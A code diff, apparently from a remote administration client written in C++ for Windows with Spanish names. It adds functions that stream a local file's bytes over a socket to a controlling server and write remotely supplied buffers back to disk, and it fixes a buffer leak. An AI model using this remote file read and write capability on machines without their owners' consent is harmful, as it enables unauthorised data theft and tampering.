@@ -161,6 +161,34 @@ void BorrarFolder(c_char* cPath) {
 	RemoveDirectoryA((LPCSTR)cPath);
 }
 
+void EditarArchivo_Guardar(std::string strPath, c_char* cBuffer, std::streamsize iBufferSize) {
+#ifdef ___DEBUG_
+	std::cout << "[!] Guardando archivo [remote-edit]: " << strPath << std::endl;
+	std::cout << "[!]Buffer:" << std::endl << cBuffer << std::endl;
+#endif
+	
+	std::ofstream localFile(strPath, std::ios::binary);
+	if (!localFile.is_open()) {
+#ifdef ___DEBUG_
+		error();
+		std::cout << "No se pudo abrir el archivo " << strPath << std::endl;
+#endif
+		return;
+	}
+
+	localFile.write(cBuffer, iBufferSize);
+
+	size_t iFinal = localFile.tellp();
+#ifdef ___DEBUG_
+	std::cout << "[!] " << iFinal << " escritos" << std::endl;
+#endif	
+
+
+	localFile.flush();
+	localFile.close();
+
+}
+
 void EnviarArchivo(const std::string& cPath, const std::string& cID, Cliente* copy_ptr) {
 #ifdef ___DEBUG_
 	std::cout << "[ID-"<<cID<<"]Enviando " << cPath << std::endl;
@@ -194,6 +222,7 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID, Cliente* co
 	strHeader += cID;
 	strHeader.append(1, '\\');
 	
+	int iHeaderSize = strHeader.size();
 
 	char* cBufferArchivo = new char[uiTamBloque];
 	int iBytesLeidos = 0;
@@ -202,11 +231,11 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID, Cliente* co
 		localFile.read(cBufferArchivo, uiTamBloque);
 		iBytesLeidos = localFile.gcount();
 		if (iBytesLeidos > 0) {
-			int iTotal = iBytesLeidos + strHeader.size();
+			int iTotal = iBytesLeidos + iHeaderSize;
 			char* nTempBuffer = new char[iTotal];
 
-			memcpy(nTempBuffer, strHeader.c_str(), strHeader.size());
-			memcpy(nTempBuffer + strHeader.size(), cBufferArchivo, iBytesLeidos);
+			memcpy(nTempBuffer, strHeader.c_str(), iHeaderSize);
+			memcpy(nTempBuffer + iHeaderSize, cBufferArchivo, iBytesLeidos);
 
 			uBytesEnviados += copy_ptr->cSend(copy_ptr->sckSocket, nTempBuffer, iTotal, 0, true);
 			Sleep(30);
@@ -232,6 +261,62 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID, Cliente* co
 	strComandoCerrar += cID;
 	copy_ptr->cSend(copy_ptr->sckSocket, strComandoCerrar.c_str(), strComandoCerrar.size(), 0, true);
 
+
+	if (cBufferArchivo) {
+		delete[] cBufferArchivo;
+		cBufferArchivo = nullptr;
+	}
+}
+
+//Enviar bytes de archivo a editar
+void EditarArchivo(const std::string strPath, const std::string strID, Cliente* copy_ptr){
+	std::ifstream localFile(strPath, std::ios::binary);
+	if (!localFile.is_open()) {
+#ifdef ___DEBUG_
+		error();
+		std::cout << "No se pudo abrir el archivo " <<strPath<< std::endl;
+#endif
+		return;
+	}
+
+	std::string strHeader = std::to_string(EnumComandos::FM_Editar_Archivo_Paquete);
+	strHeader.append(1, '\\');
+	strHeader += strID;
+	strHeader.append(1, '\\');
+
+	int iHeaderSize = strHeader.size();
+
+	int iBytesLeidos = 0;
+	int uiTamBloque = 4096;
+	char* cBufferArchivo = new char[uiTamBloque];
+	while (1) {
+		localFile.read(cBufferArchivo, uiTamBloque);
+		iBytesLeidos = localFile.gcount();
+		if (iBytesLeidos > 0) {
+			int iTotal = iBytesLeidos + iHeaderSize;
+			char* nTempBuffer = new char[iTotal];
+
+			memcpy(nTempBuffer, strHeader.c_str(), iHeaderSize);
+			memcpy(nTempBuffer + iHeaderSize, cBufferArchivo, iBytesLeidos);
+
+			int iEnviado = copy_ptr->cSend(copy_ptr->sckSocket, nTempBuffer, iTotal, 0, true);
+			Sleep(30);
+
+			if (nTempBuffer) {
+				delete[] nTempBuffer;
+				nTempBuffer = nullptr;
+			}
+
+			if(iEnviado == -1 || iEnviado == WSAECONNRESET){
+				//No se pudo enviar el paquete
+				break;
+			}
+		} else {
+			break;
+		}
+	}
+
+	localFile.close();
 
 	if (cBufferArchivo) {
 		delete[] cBufferArchivo;
